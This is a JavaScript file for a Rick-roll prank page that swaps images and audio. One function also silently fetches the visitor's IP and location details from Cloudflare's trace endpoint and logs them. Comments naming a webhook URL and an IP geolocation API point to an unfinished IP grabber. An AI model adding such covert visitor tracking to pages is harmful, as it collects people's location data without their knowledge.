//WEBHOOK: https://webhook.site/82fb7b4f-cc98-41c4-b948-1f7e70e507f3
// IP LOCATE: https://ipgeolocation.abstractapi.com

function Dementia() {
    document.getElementById("imagerick").src="https://i.postimg.cc/6qygsjVp/c4b.png";
    document.getElementById("dementia").play();
    document.getElementById("title").innerHTML="Wait...what happened rick?? whos rick??? what?";
    document.getElementById("rickmusic").pause();
}

function Rick() {
    document.getElementById("imagerick").src="https://i.postimg.cc/pd7j1Ms4/thericck.jpg";
    document.getElementById("rickmusic").play();
    document.getElementById("title").innerHTML="No way its rick astley guys!!";
    document.getElementById("dementia").pause();

    $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
        // Convert key-value pairs to JSON
        // https://stackoverflow.com/a/39284735/452587
        data = data.trim().split('\n').reduce(function(obj, pair) {
          pair = pair.split('=');
          return obj[pair[0]] = pair[1], obj;
        }, {});
        console.log(data);
      });
}